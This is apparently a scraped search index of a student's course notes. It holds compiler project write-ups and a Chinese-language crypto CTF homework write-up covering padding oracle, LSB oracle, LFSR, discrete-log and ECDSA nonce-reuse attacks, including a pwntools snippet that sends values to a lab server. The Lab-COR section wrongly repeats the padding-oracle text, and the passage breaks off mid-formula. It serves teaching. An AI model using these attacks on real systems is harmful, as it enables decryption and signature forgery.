Neural Network (CNN) (Ref: \u0026ldquo;Wootz: A Compiler Based Framework for Fast CNN Pruning via Composability\u0026rdquo;, PLDI 2019) (5 points/90)\nWhat is the technology of string solver mentioned in the 2019 PLDI paper: \u0026ldquo;Computing Summaries of String Loops in C for Better Testing and Refactoring\u0026rdquo;? (5points/95)\nP lease explain how machine learning technology can be used to improve the trade off between machine code performance and power consumption of compilers. (Ref: \u0026ldquo;Generative and Multi phase Learning for Computer Systems Optimization \u0026ldquo;, ISCA (5points/100)\n"},{"id":180,"href":"/security/course/ntu-ct/ntu-compiler-technology-project-1/","title":"NTU Compiler Technology Project 1","section":"Securities","content":" NTU Compiler Technology Project 1 # tags: NTU_CT NTU Compiler Techonology of Programming Language # AcDc Compiler # Description # This is a project from NTU (National Taiwan University) course, Compiler Technology of Programming Language. First project is aim to add multiplier and division operation in this compiler let compiler can recognize multi character identifier(variable) name by alphabet string use constant folding to optimize the statement How to use? # You can browse Assignment1.pdf. You must run in Linux OS environment(more conveniently). When you finish the coding, use $ make command directly. $ ./AcDc \u0026lt;input sample address\u0026gt; \u0026lt;output file address\u0026gt; For instance: $ ./AcDc ../test/sample1.ac ./output Something need to know first # It can not recognize the bottom line as identifier name. It can not print negative value like $1-2=-1$ expression. Actually speaking, it can calculate correctly but it can not print it out.(I\u0026rsquo;ll check it out later.) You can check constfold testbench Solution and Why: In Dc Language, the bottom line represent negative symbol. You can not just use minus as negative symbol, replace it by bottom line instead. It can not recognize identifier name with numbers. You can check longname.ac The other testbenchs can compile from Ac language to Dc language correctly. Reference # AcDc AcDcCompiler "},{"id":181,"href":"/security/course/ntu-ct/ntu-compiler-technology-project-2/","title":"NTU Compiler Technology Project 2","section":"Securities","content":" NTU Compiler Technology Project 2 # tags: NTU_CT NTU Compiler Techonology of Programming Language Scanner # :::spoiler [TOC] :::\nObjective # This is compiler project 2 that aim to construct the scanner by handmade with some sample code. The output is symbol table that the frequency of each identifier and the result is sorted.\nRun and Test # $ make /*use make in src folder*/ $ ./scanner ../test/sample1.ac Output of each sample # For sample1.ac\n/* 1: this is just a sample */ /* 2: this is a 3-line comment */ /* 3: this is /* the end ***/ Frequency of identifiers: a\t3 b\t2 c\t3 d\t4 e\t1 f\t2 func\t2 g\t2 main\t3 read\t1 write\t1 For sample2.ac\nFrequency of identifiers: loopvar\t6 main\t1 n\t3 read\t1 sum\t5 write\t3 For sample3.ac\nFrequency of identifiers: fact\t3 main\t1 n\t9 read\t1 result\t4 write\t3 For sample4.ac\n/* 1: this is * just a / sample */ /* 2: this is a 3-line comment */ /* 3: this is /* the end ***/ Frequency of identifiers: a1\t1 abc\t4 b1\t1 def\t3 main\t1 main_1\t1 n\t3 read\t1 write\t2 z_123_x_45\t1 Reference # simple intro of lex\nline comment \u0026amp; block comment implementation\nregular expression cheat sheet\nsolve: warning, rule cannot be matched\nsimple lex example\nprevious homework by other people\nstrcmp in c\n"},{"id":182,"href":"/security/course/ntu-ct/ntu-compiler-technology-project-3/","title":"NTU Compiler Technology Project 3","section":"Securities","content":" NTU Compiler Technology Project 3 # tags: NTU_CT NTU Compiler Techonology of Programming Language YACC Lex # [TOC]\nObjective # The main task for this project is to revise src/parser.y and generate parser file properly to compile test code in test folder. And then use Graphviz command to visualize the structure of these test code How to run? # Just use make to compile all files in /src. Though you\u0026rsquo;ll get a lots of warning shown as below, you can ignore them and obtain the target file parser. bison -v -d parser.y parser.y: warning: 1 shift/reduce conflict [-Wconflicts-sr] flex lexer.l gcc -g -c alloc.c gcc -g -c parser.tab.c parser.tab.c: In function ‘yyparse’: parser.tab.c:2565:7: warning: implicit declaration of function ‘yyerror’; did you mean ‘yyerrok’? [-Wimplicit-function-declaration] yyerror (YY_(\u0026#34;syntax error\u0026#34;)); ^~~~~~~ yyerrok parser.y: At top level: parser.y:825:3: warning: data definition has no type or storage class yydebug = 1; ^~~~~~~ parser.y:825:3: warning: type defaults to ‘int’ in declaration of ‘yydebug’ [-Wimplicit-int] parser.y:827:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main (argc, argv) ^~~~ parser.y: In function ‘main’: parser.y:834:5: warning: implicit declaration of function ‘printGV’; did you mean ‘printf’? [-Wimplicit-function-declaration] printGV(prog, NULL); ^~~~~~~ printf gcc -g -c functions.c gcc -g -o parser parser.tab.o alloc.o functions.o -lfl Use parser to compile all files in /test folder and you will get AST_Graph.gv in /test folder. /src ./parser ../test/control.c dot -Tpng -o ../test/control.png ../test/AST_Graph.gv ./parser ../test/decl.c dot -Tpng -o ../test/decl.png ../test/AST_Graph.gv ./parser ../test/expr.c dot -Tpng -o ../test/expr.png ../test/AST_Graph.gv ./parser ../test/func.c dot -Tpng -o ../test/func.png ../test/AST_Graph.gv Note that in parser.y, I set yydebug = 1 so that we can see the debug message from parser #ifdef YYDEBUG yydebug = 1; #endif For TA # I changed a little bit functions.c that will generate AST_Graph.gv at test/ folder. void printGV(AST_NODE *root, char* fileName) { if (fileName == NULL) { fileName = \u0026#34;../test/AST_Graph.gv\u0026#34;; } ... } Analysis # You can see the relationship between structure map and test code by yourself. control.c int main() { int i; int p; int k, j; for (i=0; i\u0026lt;9; i=i+1) { /* empty */ } for (i=0, p=4+4; i\u0026lt;9; i=i+1, p=i) { write(\u0026#34;test\u0026#34;); } for (;;) { /*empty*/ } while (1) { } while (2) { write(\u0026#34;haha\u0026#34;); write(\u0026#34;wow\u0026#34;); } if (k == j) { write(\u0026#34;first\u0026#34;); } if (k == j) { write(\u0026#34;first\u0026#34;); } else if (j == k) { write(\u0026#34;second\u0026#34;); } else { write(\u0026#34;third\u0026#34;); } } decl.c typedef float GFLOAT; int main() { typedef int INT, INT2, INT3; typedef float FLOAT; typedef void VOID; typedef void VOID2, VOID3; INT f[3][3*3-(4+2)/2]; FLOAT f2; } expr.c int fn1() { return 1; } float fn3() { return 1.0; } int fn4(int a, int b) { return 1; } int expr(int a, int b, int c, int d, float fa, float fb, float fc) { int i, j, k, l; float fi = 1.0, fj = 2.0, fk = 3.0, fl = 4.0; fi = 1.2*fi + -fj * (fl - fk * fn3()); fi = -fn3() -(-(-(4))); fi = !fn3() -(!(!(4))); i = !fn1(); i = 1 \u0026lt; 2; i = 1 \u0026gt; 2; i = 1 \u0026gt;= 2; i = 1 \u0026lt;= 2; i = 1 != 2; i = 1 == 2; i = fn4(1+3*4*fn4(2,3), 3); return 1; } int main() { } func.c int fn1() { int ABC = 5; return ABC+5; } void fn2() { } void fn3(int a, int b[3][4]) { } int main() { int b[4][4]; fn1(); fn2(); fn3(2, b); } Reference # Github example Simple intro of yacc \u0026amp; lex Simple intro of Graphviz A GUIDE TO LEX \u0026amp; YACC from TA 大推：以lex/yacc實作算式計算機\n"},{"id":183,"href":"/security/course/ntu-ct/ntu-compiler-technology-project-4/","title":"NTU Compiler Technology Project 4","section":"Securities","content":" NTU Compiler Technology Project 4 # tags: NTU_CT NTU Compiler Techonology of Programming Language Code Generation # [TOC]\nHow to run? # First, put your testing file and main.S to the folder same as parser file\n$ make $ ./parser [testing file].c $ aarch64-linux-gnu-gcc -static -O0 main.S $ qemu-aarch64-static ./a.out Or, you can put the run.sh and main.S in the same directory and run\n$ ./run.sh [your parser] [the C file] $ qemu-aarch64-static ./a.out Note that you must change your test file\u0026rsquo;s main() to MAIN()\nImplementation # Just show the mainly implementation concept\nAssignment statements # void genAssignStmt(AST_NODE *assignNode) { AST_NODE *it = assignNode; unpack(it, id, relop_expr); REG reg = genExprRelated(relop_expr); genVariableAssign(id, reg); freeReg(reg); } ... void genVariableAssign(AST_NODE *idNode, REG val) { assert ( idNode-\u0026gt;nodeType == IDENTIFIER_NODE ); assert ( getIDEntry(idNode) != NULL ); assert ( getIDAttr(idNode)-\u0026gt;attributeKind == VARIABLE_ATTRIBUTE ); TypeDescriptor* typeDescriptor = getIDTypeDescriptor(idNode); if(getIDKind(idNode) == ARRAY_ID){ genArrayAssign(idNode, val); return; }else{ REG addr; if(getIDGlobal(idNode)){ addr = getReg(); fprintf(output, \u0026#34;ldr x%d, =_g_%s\\n\u0026#34;, addr, getIDName(idNode)); }else{ int offset = getIDOffset(idNode); addr = genIntLiteral(offset); fprintf(output, \u0026#34;sub x%d, x29, x%d\\n\u0026#34;, addr, addr); fprintf(stderr, \u0026#34;Var assign name: %s, offset: %d\\n\u0026#34;, getIDName(idNode), offset); } if(idNode-\u0026gt;dataType == INT_TYPE){ fprintf(output, \u0026#34;str w%d, [x%d, #0]\\n\u0026#34;, val, addr); }else{ fprintf(output, \u0026#34;str s%d, [x%d, #0]\\n\u0026#34;, val, addr); } freeReg(addr); } return; } Arithmetic expressions # REG genRelopExpr(AST_NODE *exprNode) { AST_NODE* it = exprNode-\u0026gt;child; if (isConstExpr(exprNode)) return genConstValue(exprNode); if (getExprKind(exprNode) == BINARY_OPERATION) { unpack(it, lvalue, rvalue); REG LReg = genExprRelated(lvalue); REG RReg = genExprRelated(rvalue); if(lvalue-\u0026gt;dataType == INT_TYPE \u0026amp;\u0026amp; rvalue-\u0026gt;dataType == INT_TYPE){ switch(getExprOp(exprNode)){ case BINARY_OP_ADD: fprintf(output, \u0026#34;add w%d, w%d, w%d\\n\u0026#34;, LReg, LReg, RReg); break; case BINARY_OP_SUB: fprintf(output, \u0026#34;sub w%d, w%d, w%d\\n\u0026#34;, LReg, LReg, RReg); break; case BINARY_OP_MUL: fprintf(output, \u0026#34;mul w%d, w%d, w%d\\n\u0026#34;, LReg, LReg, RReg); break; case BINARY_OP_DIV: fprintf(output, \u0026#34;sdiv w%d, w%d, w%d\\n\u0026#34;, LReg, LReg, RReg); break; case BINARY_OP_EQ: fprintf(output, \u0026#34;cmp w%d, w%d\\n\u0026#34;, LReg, RReg); fprintf(output, \u0026#34;cset w%d, eq\\n\u0026#34;, LReg); break; case BINARY_OP_GE: fprintf(output, \u0026#34;cmp w%d, w%d\\n\u0026#34;, LReg, RReg); fprintf(output, \u0026#34;cset w%d, ge\\n\u0026#34;, LReg); break; case BINARY_OP_LE: fprintf(output, \u0026#34;cmp w%d, w%d\\n\u0026#34;, LReg, RReg); fprintf(output, \u0026#34;cset w%d, le\\n\u0026#34;, LReg); break; case BINARY_OP_NE: fprintf(output, \u0026#34;cmp w%d, w%d\\n\u0026#34;, LReg, RReg); fprintf(output, \u0026#34;cset w%d, ne\\n\u0026#34;, LReg); break; case BINARY_OP_GT: fprintf(output, \u0026#34;cmp w%d, w%d\\n\u0026#34;, LReg, RReg); fprintf(output, \u0026#34;cset w%d, gt\\n\u0026#34;, LReg); break; case BINARY_OP_LT: fprintf(output, \u0026#34;cmp w%d, w%d\\n\u0026#34;, LReg, RReg); fprintf(output, \u0026#34;cset w%d, lt\\n\u0026#34;, LReg); break; case BINARY_OP_AND: fprintf(output, \u0026#34;cmp w%d, #0\\n\u0026#34;, LReg); fprintf(output, \u0026#34;cset w%d, ne\\n\u0026#34;, LReg); fprintf(output, \u0026#34;cmp w%d, #0\\n\u0026#34;, RReg); fprintf(output, \u0026#34;cset w%d, ne\\n\u0026#34;, RReg); fprintf(output, \u0026#34;and w%d, w%d, w%d\\n\u0026#34;, LReg, LReg, RReg); break; case BINARY_OP_OR: fprintf(output, \u0026#34;cmp w%d, #0\\n\u0026#34;, LReg); fprintf(output, \u0026#34;cset w%d, ne\\n\u0026#34;, LReg); fprintf(output, \u0026#34;cmp w%d, #0\\n\u0026#34;, RReg); fprintf(output, \u0026#34;cset w%d, ne\\n\u0026#34;, RReg); fprintf(output, \u0026#34;orr w%d, w%d, w%d\\n\u0026#34;, LReg, LReg, RReg); break; } }else{ // Float expr if(lvalue-\u0026gt;dataType == INT_TYPE) fprintf(output, \u0026#34;scvtf s%d, w%d\\n\u0026#34;, LReg, LReg); if(rvalue-\u0026gt;dataType == INT_TYPE) fprintf(output, \u0026#34;scvtf s%d, w%d\\n\u0026#34;, RReg, RReg); switch(getExprOp(exprNode)){ case BINARY_OP_ADD: fprintf(output, \u0026#34;fadd s%d, s%d, s%d\\n\u0026#34;, LReg, LReg, RReg); break; case BINARY_OP_SUB: fprintf(output, \u0026#34;fsub s%d, s%d, s%d\\n\u0026#34;, LReg, LReg, RReg); break; case BINARY_OP_MUL: fprintf(output, \u0026#34;fmul s%d, s%d, s%d\\n\u0026#34;, LReg, LReg, RReg); break; case BINARY_OP_DIV: fprintf(output, \u0026#34;fdiv s%d, s%d, s%d\\n\u0026#34;, LReg, LReg, RReg); break; case BINARY_OP_EQ: fprintf(output, \u0026#34;fcmp s%d, s%d\\n\u0026#34;, LReg, RReg); fprintf(output, \u0026#34;cset w%d, eq\\n\u0026#34;, LReg); break; case BINARY_OP_GE: fprintf(output, \u0026#34;fcmp s%d, s%d\\n\u0026#34;, LReg, RReg); fprintf(output, \u0026#34;cset w%d, ge\\n\u0026#34;, LReg); break; case BINARY_OP_LE: fprintf(output, \u0026#34;fcmp s%d, s%d\\n\u0026#34;, LReg, RReg); fprintf(output, \u0026#34;cset w%d, le\\n\u0026#34;, LReg); break; case BINARY_OP_NE: fprintf(output, \u0026#34;fcmp s%d, s%d\\n\u0026#34;, LReg, RReg); fprintf(output, \u0026#34;cset w%d, ne\\n\u0026#34;, LReg); break; case BINARY_OP_GT: fprintf(output, \u0026#34;fcmp s%d, s%d\\n\u0026#34;, LReg, RReg); fprintf(output, \u0026#34;cset w%d, gt\\n\u0026#34;, LReg); break; case BINARY_OP_LT: fprintf(output, \u0026#34;fcmp s%d, s%d\\n\u0026#34;, LReg, RReg); fprintf(output, \u0026#34;cset w%d, lt\\n\u0026#34;, LReg); break; case BINARY_OP_AND: fprintf(output, \u0026#34;fcmp s%d, #0\\n\u0026#34;, LReg); fprintf(output, \u0026#34;cset w%d, ne\\n\u0026#34;, LReg); fprintf(output, \u0026#34;fcmp s%d, #0\\n\u0026#34;, RReg); fprintf(output, \u0026#34;cset w%d, ne\\n\u0026#34;, RReg); fprintf(output, \u0026#34;orr w%d, w%d, w%d\\n\u0026#34;, LReg, LReg, RReg); break; case BINARY_OP_OR: fprintf(output, \u0026#34;fcmp s%d, #0\\n\u0026#34;, LReg); fprintf(output, \u0026#34;cset w%d, ne\\n\u0026#34;, LReg); fprintf(output, \u0026#34;fcmp s%d, #0\\n\u0026#34;, RReg); fprintf(output, \u0026#34;cset w%d, ne\\n\u0026#34;, RReg); fprintf(output, \u0026#34;orr w%d, w%d, w%d\\n\u0026#34;, LReg, LReg, RReg); break; } } freeReg(RReg); return LReg; }else{ // Unary operation unpack(it, value); REG reg = genExprRelated(value); if(value-\u0026gt;dataType == INT_TYPE){ switch(getExprOp(exprNode)){ case UNARY_OP_POSITIVE: break; case UNARY_OP_NEGATIVE: fprintf(output, \u0026#34;neg w%d, w%d\u0026#34;, reg, reg); break; case UNARY_OP_LOGICAL_NEGATION: fprintf(output, \u0026#34;cmp w%d, #0\\n\u0026#34;, reg); fprintf(output, \u0026#34;cset w%d, eq\\n\u0026#34;, reg); break; } }else{ switch(getExprOp(exprNode)){ case UNARY_OP_POSITIVE: break; case UNARY_OP_NEGATIVE: fprintf(output, \u0026#34;fneg s%d, s%d\u0026#34;, reg, reg); break; case UNARY_OP_LOGICAL_NEGATION: fprintf(output, \u0026#34;fcmp s%d, #0\\n\u0026#34;, reg); fprintf(output, \u0026#34;cset w%d, eq\\n\u0026#34;, reg); break; } } return reg; } } Control statements: while, if-then-else # void genWhile(AST_NODE *whileNode) { AST_NODE *it = whileNode; unpack(it, test, stmt); int while_n = const_n++; fprintf(output, \u0026#34;_WHILE_%d:\\n\u0026#34;, while_n); if (test-\u0026gt;nodeType == STMT_NODE \u0026amp;\u0026amp; getStmtKind(test) == ASSIGN_STMT){ genAssignStmt(test); test = test-\u0026gt;child; } REG reg = genExprRelated(test); if (test-\u0026gt;dataType == FLOAT_TYPE) fprintf(output, \u0026#34;fcvtzs w%d, s%d\\n\u0026#34;, reg, reg); fprintf(output, \u0026#34;cmp w%d, #0\\n\u0026#34;, reg); freeReg(reg); fprintf(output, \u0026#34;beq _WHILE_END_%d\\n\u0026#34;, while_n); genStmt(stmt); fprintf(output, \u0026#34;b _WHILE_%d\\n\u0026#34;, while_n); fprintf(output, \u0026#34;_WHILE_END_%d:\\n\u0026#34;, while_n); } ... void genIf(AST_NODE *ifNode) { AST_NODE *it = ifNode; unpack(it, test, stmt, elseStmt); int if_n = const_n++; fprintf(output, \u0026#34;_IF_%d:\\n\u0026#34;, if_n); if (test-\u0026gt;nodeType == STMT_NODE \u0026amp;\u0026amp; getStmtKind(test) == ASSIGN_STMT){ genAssignStmt(test); test = test-\u0026gt;child; } REG reg = genExprRelated(test); if (test-\u0026gt;dataType == FLOAT_TYPE) fprintf(output, \u0026#34;fcvtzs w%d, s%d\\n\u0026#34;, reg, reg); fprintf(output, \u0026#34;cmp w%d, #0\\n\u0026#34;, reg); freeReg(reg); fprintf(output, \u0026#34;beq _ELSE_%d\\n\u0026#34;, if_n); genStmt(stmt); fprintf(output, \u0026#34;b _END_IF_%d\\n\u0026#34;, if_n); fprintf(output, \u0026#34;_ELSE_%d:\\n\u0026#34;, if_n); //if (elseStmt-\u0026gt;nodeType != NUL_NODE) genStmt(elseStmt); fprintf(output, \u0026#34;_END_IF_%d:\\n\u0026#34;, if_n); } Parameterless procedure calls # void genFunctionCall(AST_NODE *functionCallNode) { AST_NODE *it = functionCallNode; unpack(it, id, param); char *name = getIDName(id); if (!strcmp(name, \u0026#34;write\u0026#34;)){ genWrite(functionCallNode); } else if (!strcmp(name, \u0026#34;read\u0026#34;)){ fprintf(output, \u0026#34;bl _read_int\\n\u0026#34;); } else if (!strcmp(name, \u0026#34;fread\u0026#34;)){ fprintf(output, \u0026#34;bl _read_float\\n\u0026#34;); } else { fprintf(output, \u0026#34;bl _start_%s\\n\u0026#34;, name); } } Read and Write I/O calls # void genWrite(AST_NODE *functionCallNode){ AST_NODE *it = functionCallNode; unpack(it, id, paramList); AST_NODE *param = paramList-\u0026gt;child; REG reg = genExprRelated(param); switch(param-\u0026gt;dataType){ case INT_TYPE: fprintf(output, \u0026#34;mov w0, w%d\\n\u0026#34;, reg); fprintf(output, \u0026#34;bl _write_int\\n\u0026#34;); break; case FLOAT_TYPE: fprintf(output, \u0026#34;fmov s0, s%d\\n\u0026#34;, reg); fprintf(output, \u0026#34;bl _write_float\\n\u0026#34;); break; case CONST_STRING_TYPE: fprintf(output, \u0026#34;mov x0, x%d\\n\u0026#34;, reg); fprintf(output, \u0026#34;bl _write_str\\n\u0026#34;); break; } freeReg(reg); } Experience result # assign.c control.c expr.c func.c hello.c io.c "},{"id":184,"href":"/security/course/ntu-cs/crypto/ntu-cs-2023-hw1-write-up/","title":"NTU CS 2023 HW1 Write Up","section":"Securities","content":" NTU CS 2023 HW1 Write Up # Name: 何秉學 Student ID: R11921A16 :::spoiler TOC [TOC] :::\nLab-COR # Flag: FLAG{Corre1ati0n_Attack!_!}\n解題流程與思路 # 這一題是簡單的padding oracle attack，他一樣是應用在CBC mode上，只是他padding的方式和上課教的有一點不一樣，他會先在最後放一個0x80然後接續放0x00直到長度%16==0，同樣的，我們可以用上課教的方式:\nWhat we have: 我們有的東西就是密文，所以可以利用它動一些手腳 Our Goal 1: 目標是要取得原本和47進行XOR的數字是多少 Our Goal 2: 這樣才可以取得最後的明文69 How to achieve: 我們可以簡單猜一個byte，從0x00開始，把密文換成猜測的byte，這樣256種組合和原本的Goal 1所求的byte進行XOR後會padding正確(也就是0x01)，此時假設我們已經猜到目前是0x2f符合padding正確的目標，代表現在的假明文是0x01，則原本和0x47進行XOR的數字就是0x01⊕0x2f，然後我們就可以回到原本解密的流程，也就是原本的密文0x47⊕剛剛得知的(0x01⊕0x2f)，就會得到想要的正確的明文0x69 所以套用到今天的lab意思也是一樣，如果要知道padding是否正確可以問oracle，反正只要符合明文+0x80+(0\u0026hellip;15)*0x00，這一題的flag長度可以從題目給的ciphertext看出來，顯然扣掉16bytes的initial vector後，flag的長度是32 bytes，也就是說我們從第二個block開始解，我們可以單獨把第一個ciphertext block當成第二個ciphertext block的initial vector，合併後再一起送出去，然後不斷變化IV的最後一個byte，如果oracle回傳Well received :)代表第一個bytes猜對了，我們就可以把flag的最後一個bytes求出來$\\to$我們猜的byte⊕原本ciphertext的最後一個byte⊕0x80(0x80是我們判斷padding正確的依據)，當然找到真正的plaintext byte後要把我們猜測的block恢復原狀，接著繼續找下一個byte\nLab-LSB # Flag: FLAG{Viycx_qsklsjgmeld_fgd_spkgjo}\n解題流程與思路 # 這一題是變形過的Lease Significant Bit，上課教的例子是mod 2下的結果，而看source code可以知道目前他是mod 3下的結果，但換湯不換藥，只要把上課教的部分全部換成mod 3就可以了\n首先計算$3^{-1},3^{-2},3^{-3},3^{-4},\u0026hellip;,3^{-(log_3^n)}\\ (mod\\ 3)$，並建立一個table 依序執行上課教的流程 密文*$(3^{-1})^e$ 合併要減掉的部分，也就是把之前已知道所有部分都乘以table上對應的反元素 再把oracle回傳的假明文減掉上面合併的部分(記得mod)，就是我們要的bit Lab-POA # Flag: FLAG{pAdd1NG_0rAcL3_A77aCK}\n解題流程與思路 # 這一題是簡單的padding oracle attack，他一樣是應用在CBC mode上，只是他padding的方式和上課教的有一點不一樣，他會先在最後放一個0x80然後接續放0x00直到長度%16==0，同樣的，我們可以用上課教的方式:\nWhat we have: 我們有的東西就是密文，所以可以利用它動一些手腳 Our Goal 1: 目標是要取得原本和47進行XOR的數字是多少 Our Goal 2: 這樣才可以取得最後的明文69 How to achieve: 我們可以簡單猜一個byte，從0x00開始，把密文換成猜測的byte，這樣256種組合和原本的Goal 1所求的byte進行XOR後會padding正確(也就是0x01)，此時假設我們已經猜到目前是0x2f符合padding正確的目標，代表現在的假明文是0x01，則原本和0x47進行XOR的數字就是0x01⊕0x2f，然後我們就可以回到原本解密的流程，也就是原本的密文0x47⊕剛剛得知的(0x01⊕0x2f)，就會得到想要的正確的明文0x69 所以套用到今天的lab意思也是一樣，如果要知道padding是否正確可以問oracle，反正只要符合明文+0x80+(0\u0026hellip;15)*0x00，這一題的flag長度可以從題目給的ciphertext看出來，顯然扣掉16bytes的initial vector後，flag的長度是32 bytes，也就是說我們從第二個block開始解，我們可以單獨把第一個ciphertext block當成第二個ciphertext block的initial vector，合併後再一起送出去，然後不斷變化IV的最後一個byte，如果oracle回傳Well received :)代表第一個bytes猜對了，我們就可以把flag的最後一個bytes求出來$\\to$我們猜的byte⊕原本ciphertext的最後一個byte⊕0x80(0x80是我們判斷padding正確的依據)，當然找到真正的plaintext byte後要把我們猜測的block恢復原狀，接著繼續找下一個byte\nHW-LFSR # Flag: FLAG{Lf5r_15_50_eZZzZzZZZzzZzzz}\n解題流程與思路 # 這一題和前面的triLFSR不一樣的地方在於他只有一層的LFSR，但他只會每個70個才會給一個state，換句話說我們只能拿到$S_{710+70},\\ S_{711+70},\\ S_{712+70},\\ S_{713+70}\u0026hellip;$(從0開始算)，而前面256個拿到的State最後會和flag進行XOR，只有最後70個是最純粹的State\nWhat we have 我們有的東西就是Companion Matrix，因為題目有給taps，所以可以建出上課提到的矩陣；另外我們還有最後出現的70個State，雖然是每格70個出現一次，換句話說就是$State_{71256+70},\\ State_{71257+70},\\ State_{71258+70},\\ \u0026hellip;State_{71325+70}$(從0開始算)\nGoal 既然我們知道了State的公式為$s_m = p_0s_0 + p_1s_1 + … + p_{m-1}s_{m-1}$，也就是companion matrix的最後一列$*$那64個initial state就會是新的state，換句話說，繼續往下做，其實就只是把companion matrix多乘幾次，然後還是一樣乘以initial state，然後我們只要取得companion matrix乘完之後的最後一列，就是下一個新的state的特徵，如下圖所示: 在Round 0時，companion matrix的最後一列當然就是$S_{64}$的特徵，再往下做，也就是Round 1時，companion matrix的平方後，再取最後一列就是$S_{65}$的特徵，而題目給我們的ouptut[0]以state來說就是第70個(以0來說)，所以companion matrix的7次方，再取最後一列，以此類推，我們陸續算到output[256](這是第一個沒有和flag XOR的bit)，也就是companion matrix的$71256+7=18183$次方再取最後一列，就是$S_{71256+70}$的特徵，自此開始，我們就可以開始把這些特徵存起來，存滿64個後，再取反矩陣，乘上原本得到的那64個state，就可以得到一開始的initial state\n完整的對應關係如下圖 HW-Oracle # 解題流程與思路 # 這一題真的非常難，而且要通靈很久，首先Oracle.py的工作是把一張flag image用AES加密，並且把AES會用到的key/iv都用RSA再加密，然後通通傳給Alice，而Alice.py的工作才是本次作業實際上的Oracle，他會吃key/iv/ciphertext，前兩者是decimal，後者是hex形式，一開始可以先試看看把這三者傳過去，理論上只要格式對了就會回傳OK! Got it.\nencrypted_key = 65690013242775728459842109842683020587149462096059598501313133592635945234121561534622365974927219223034823754673718159579772056712404749324225325531206903216411508240699572153162745754564955215041783396329242482406426376133687186983187563217156659178000486342335478915053049498619169740534463504372971359692 encrypted_iv = 35154524936059729204581782839781987236407179504895959653768093617367549802652967862418906182387861924584809825831862791349195432705129622783580000716829283234184762744224095175044663151370869751957952842383581513986293064879608592662677541628813345923397286253057417592725291925603753086190402107943880261658 enc_png = open(\u0026#39;./Crypto/HW/Oracle/encrypted_flag_d6fbfd5306695c4a.not_png\u0026#39;, \u0026#39;rb\u0026#39;).read() r = remote(\u0026#34;10.113.184.121\u0026#34;, 10031) r.sendlineafter(b\u0026#39;key: \u0026#39;, str(encrypted_key).encode()) r.sendlineafter(b\u0026#39;iv: \u0026#39;, str(encrypted_iv).encode()) r.sendlineafter(b\u0026#39;ciphertext: \u0026#39;, enc_png.hex().encode()) print(r.recvline().decode().strip()) 解題的手法經@Yaan的小提示，完整如下:\n首先我們手上可控的地方，就是key/iv/ciphertext，一開始的想法是，由於此次的flag是一張png，所以一開始的magic header一定都一樣，所以可以透過這個magic header推測出IV是多少，但這樣的作法卻沒辦法知道key，所以這個方法行不通\n正確的作法是控制key/iv，變成自己設定的東西，然後試圖加密plaintext(同樣也是自己設定)，然後把自己設定的ciphertext/key以及原本題目給的encrypted_key或是encrypted_iv丟到oracle，要解密的部分(也就是encrypted_key/encrypted_iv)就當作是iv的部分輸入，這樣神奇的操作如下圖所示 為甚麼這樣可以解出我們想要解的東西?那就要取決於如何控制plaintext/iv，key可以隨便控，而plaintext則是從零開始，iv也是全部都是零，這樣的好處是pt用AES加密前的部份是我們知道的，換句話說，在解密的時候和iv XOR前的數值也是知道的，此時我們可以從oracle output知道padding正確與否，我們又知道和iv XOR的數值是多少，則我們一定可以利用POA的方式推出原本的IV是多少\n舉個例子 若 encrypted_iv=b'0123456789abcdef' $\\to$ unknown(也是我們想知道的部分) self_pt=b'0000000000000000' $\\to$ self defined self_iv=b'0000000000000000' $\\to$ self defined 則我們開始改變self_pt的最後一個byte，也就是b'0...00',b'0...01',b'0...02'\u0026hellip;，讓他和encrypted_iv進行XOR之後判斷padding正確與否\n如果padding正確也就代表目前的padding結果是0x01，而此時的self_pt=b'0...0e'，所以想當然encrypted_iv=XXX...f，而換到下一round，我們也改造一下self_pt，首先原本最後一個byte(0xe)要改成$0xe\\oplus 0x2=0xc$，因為下一round的padding必須要是0x0202才會正確，然後我們就可以改變倒數第二個byte(一樣從零開始)，也就是b'0...0c',b'0...1c',b'0...2c'\u0026hellip;，以此類推就可以得出真正的IV是多少了，而encrypted_key的做法也和IV一模一樣\nLab-dlog # Flag: FLAG{YouAreARealRealRealRealDiscreteLogMaster}\n解題流程與思路 # 基本上這一題和上一個學期上的CNS中，作業二的Little Knowledge Proof概念一模一樣，當時還不知道這是啥騷操作，現在覺得非常簡單，就是套用了Pohlig-Hellman的原理進行破解\n首先看source code需要我們提供一個prime($N$)，然後跟一個不重要的底數$g$，接著題目return一個hint就是$hint=g^{flag}\\ mod(N)$，因此按照discrete log的難度，我們很難針對hint進行brute force，縱使我們知道N,g,hint也一樣，但因為N是我們提供的，所以我可以故意給他一個smooth prime，也就是$N-1$是由多個prime相乘而得 我們可以用上課教過的Pohlig-Hellman原理去思考，也就是先把群的範圍縮小，再利用BSGS的方法找到$x_i$，這時雖然得到$x_i$但由於是mod $p_i$的結果，就不是真正的$x$，要利用CRT把多個$x_i$還原成原本的$x$，幸虧以上操作sage都做好了 Lab-signature # Flag: FLAG{EphemeralKeyShouldBeRandom}\n解題流程與思路 # 這一題主要就是利用上課提到的nonce $k$不隨機的問題，因為$k$只能用一次，也就代表他需要夠隨機，如果像LCG這樣的psudo random generator產生的話，一但被compromise，就會被推導出private key $d$，而這個lab就是有這樣的問題\n觀察source code會發現不同的nonce $k$之間會產生一個1337倍數的關係，然後如果request Give me the FLAG.的signature會被拒絕，所以只能自己產生Give me the FLAG.的signature再丟給server檢查，如果過了就可以拿到flag，但重點是要怎麼偽造signature假裝是server簽的?就是要想辦法拿到server產生的private key $d$，可以詳細看一下source code中提到，通常public key都一樣，所以重點是$d$才能產生private key，然後用private key簽署message E = SECP256k1 G, n = E.generator, E.order d = randint(1, n) pubkey = Public_key(G, d*G) prikey = Private_key(pubkey, d) ↓ sig = prikey.sign(bytes_to_long(h), k) 已知(題目給的部分) 只要我們給兩次要簽章的message，總共可以得到以下資訊 $$ coordinate\\ (x_0,\\ y_0),\\ hash\\ H_1,\\ hash\\ H_2,\\ signature\\ (s_1,\\ r_1),\\ (s_2,\\ r_2) $$ 推導 假設$msg=b\u0026rsquo;a\u0026rsquo;$ $$ H_1 = H_2 = sha256(msg)\\ \\begin{aligned} k_1 \u0026amp;= {s_1}^{-1} \\cdot (H_1 + d\\cdot r_1)={s_1}^{-1} \\cdot H_1 + d\\cdot r_1 \\cdot {s_1}^{-1}\\ k_2 \u0026amp;= {s_2}^{-1} \\cdot (H_2 + d\\cdot r_2) = 1337\\times k_1=\\ \u0026amp;= {s_2}^{-1} \\cdot H_2 + {s_2}^{-1}\\cdot d\\cdot r_2\\ \u0026amp;= 1337 \\cdot {s_1}^{-1} \\cdot 